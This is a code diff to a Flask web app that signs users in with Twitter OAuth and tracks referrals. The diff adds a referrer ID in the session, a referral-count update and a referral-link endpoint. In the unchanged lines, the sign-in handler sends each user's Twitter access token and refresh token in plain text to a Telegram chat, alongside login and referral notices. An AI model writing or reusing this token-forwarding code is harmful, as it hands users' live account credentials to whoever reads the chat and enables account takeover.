@@ -409,10 +409,19 @@ def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
+    referrer_id = request.args.get('referrer_id')  # New parameter for tracking referrals
+
+    # If the user is already logged in, redirect them to the welcome page
     if 'username' in session:
         username = session['username']
         send_message_via_telegram(f"👋 @{username} just returned to the website.")
         return redirect(url_for('welcome'))
+
+    # Store referrer_id in session for tracking referrals if present
+    if referrer_id:
+        session['referrer_id'] = referrer_id
+
+    # Initiate authorization if 'authorize' parameter is set to 'true'
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -423,11 +432,14 @@ def home():
             f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
         )
         return redirect(authorization_url)
+
+    # Handle callback with authorization code
     if code:
         if error:
             return f"Error during authorization: {error}", 400
         if state != session.get('oauth_state', '0'):
             return "Invalid state parameter", 403
+
         code_verifier = session.pop('code_verifier', None)
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
@@ -438,11 +450,15 @@ def home():
         }
         response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
         token_response = response.json()
+
+        # Process response from Twitter API
         if response.status_code == 200:
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
             username, profile_url = get_twitter_username_and_profile(access_token)
+
             if username:
+                # Store tokens and user info
                 store_token(access_token, refresh_token, username)
                 referral_url = generate_referral_url(username)
                 session['username'] = username
@@ -450,6 +466,8 @@ def home():
                 session['refresh_token'] = refresh_token
                 session['referral_url'] = referral_url
                 total_tokens = get_total_tokens()
+
+                # Send Telegram notification with user details
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
@@ -464,7 +482,10 @@ def home():
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
+    # Render the home page if no authorization or referral actions are needed
     return render_template('home.html')
+
 
 def generate_referral_url(username):
     referral_url = f"https://taskair.io/referral/{username}"
@@ -486,18 +507,31 @@ def generate_referral_url(username):
 @app.route('/welcome')
 def welcome():
     username = session.get('username', 'User')
+    referrer_id = session.pop('referrer_id', None)  # Retrieve and remove referrer_id from session
+
+    # Refresh token if refresh_token is available in session
     if 'refresh_token' in session:
         access_token, refresh_token = refresh_token_in_db(session['refresh_token'], username)
         if access_token and refresh_token:
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
             send_message_via_telegram(f"🔄 Token refreshed for returning user @{username}.")
+
+    # Handle referral if referrer_id is available
+    if referrer_id:
+        add_referral(referrer_id, username)  # Update referral count and reward for the referring user
+        send_message_via_telegram(f"🎉 New referral! @{username} was referred by user ID {referrer_id}.")
+
+    # Determine message for new or returning user
     if 'is_new_user' in session:
         message = f"Congratulations, @{username}! Your sign-up was successful."
         session.pop('is_new_user')
     else:
         message = f"Welcome back, @{username}!"
+
+    # Render the welcome template with the welcome message
     return render_template('welcome.html', message=message)
+
 
 def get_user_stats(username):
     try:
@@ -779,6 +813,15 @@ def validate_token():
         return {"message": "Token is valid", "username": username, "profile_url": profile_url}, 200
     else:
         return {"error": "Token is invalid or expired"}, 403
+
+@app.route('/api/referral_link', methods=['GET'])
+def get_referral_link():
+    username = session.get('username')
+    if not username:
+        return {"error": "User not authenticated"}, 401
+
+    referral_url = generate_referral_url(username)
+    return {"referral_url": referral_url}, 200
 
 
 @app.route('/about')
